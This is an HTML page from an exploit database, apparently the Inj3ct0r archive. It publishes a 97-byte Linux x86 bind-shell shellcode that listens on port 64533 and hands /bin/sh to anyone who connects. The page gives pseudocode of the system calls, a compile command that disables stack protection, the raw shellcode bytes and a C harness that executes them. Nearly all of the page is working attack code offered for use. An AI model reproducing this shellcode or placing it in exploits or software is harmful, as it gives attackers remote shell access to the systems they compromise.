<html><head><title>Linux/x86 - bind sh@64533 - 97 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_&lt;_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1     ###############################################################  1
0     I'm Magnefikko member from Inj3ct0r Team &amp; Promhyl Studies Team  1
1     ###############################################################  0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1


	by Magnefikko
	05.07.2010
	magnefikko@gmail.com
	Promhyl Studies :: http://promhyl.tk
	Subgroup: #PRekambr
	Name: 97 bytes bind sh@64533
	Platform: Linux x86
	
	sock = socket(PF_INET, SOCK_STREAM, 0);
	bind(sock, *[2, 64533, 0], 16);
	listen(sock, 5);
	nsock = accept(sock, 0, 0);
	dup2(nsock, 0);
	dup2(nsock, 1);
	execve(&quot;/bin/sh&quot;, 0, 0); // http://promhyl.tk/index.php?a=art&amp;art=83

	gcc -Wl,-z,execstack filename.c

	shellcode:

\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc
\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58
\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50
\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80

*/


int main(){
	char shell[] =
&quot;\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66&quot;
&quot;\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd&quot;
&quot;\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58&quot;
&quot;\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80&quot;;
	printf(&quot;by Magnefikko\nmagnefikko@gmail.com\npromhyl.tk\n\nstrlen(shell) = %d\n&quot;, strlen(shell));
	(*(void (*)()) shell)();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
